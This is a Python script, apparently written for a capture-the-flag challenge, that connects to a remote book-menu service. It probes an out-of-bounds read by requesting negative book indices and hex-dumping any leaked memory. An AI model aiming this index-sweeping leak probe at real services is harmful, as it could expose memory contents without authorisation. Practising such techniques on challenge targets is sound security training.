import socket
import time

HOST = "host5.metaproblems.com"
PORT = 5020


def recv_all(s, timeout=1.0):
    s.settimeout(timeout)
    data = b""
    try:
        while True:
            chunk = s.recv(4096)
            if not chunk:
                break
            data += chunk
            if len(chunk) < 4096:
                break
    except socket.timeout:
        pass
    return data


s = socket.create_connection((HOST, PORT), timeout=10)
print("[+] connected")

print(recv_all(s, 1).decode(errors="ignore"))

# Start a book (option 1)
s.sendall(b"1\n")
time.sleep(0.15)
print(recv_all(s, 1).decode(errors="ignore"))

# Send title
s.sendall(b"A\n")
time.sleep(0.15)
print(recv_all(s, 1).decode(errors="ignore"))

# Send page count
s.sendall(b"1\n")
time.sleep(0.15)
print(recv_all(s, 1).decode(errors="ignore"))


# We'll perform a sweep of negative indices using the "read book" (option 3)
def try_read_index(idx):
    try:
        # choose read
        s.sendall(b"3\n")
        time.sleep(0.05)
        _ = recv_all(s, 0.2)
        # send index
        s.sendall(str(idx).encode() + b"\n")
        # allow the server to respond
        time.sleep(0.25)
        data = recv_all(s, 0.5)
        return data
    except Exception as e:
        print(f"[!] exception reading index {idx}: {e}")
        return b""


print("[*] scanning negative indices -1..-20 for leaks")
for i in range(-1, -21, -1):
    data = try_read_index(i)
    if not data:
        print(f"[{i}] no response")
        continue
    # If response contains "Invalid book" it's not useful
    if b"Invalid book" in data:
        print(f"[{i}] Invalid book")
        continue
    # Print a short hexdump if it looks interesting
    print(f"[{i}] got {len(data)} bytes")
    text = data.decode(errors="ignore")
    printable = "".join([c if 32 <= ord(c) < 127 else "." for c in text])
    print("PREVIEW:", printable[:200])
    import binascii

    print("HEX:", binascii.hexlify(data[:256]).decode())

# Try to read any remaining data
more = recv_all(s, 2)
if more:
    try:
        print(more.decode(errors="ignore"))
    except Exception:
        print(repr(more))

s.close()
print("[+] done")
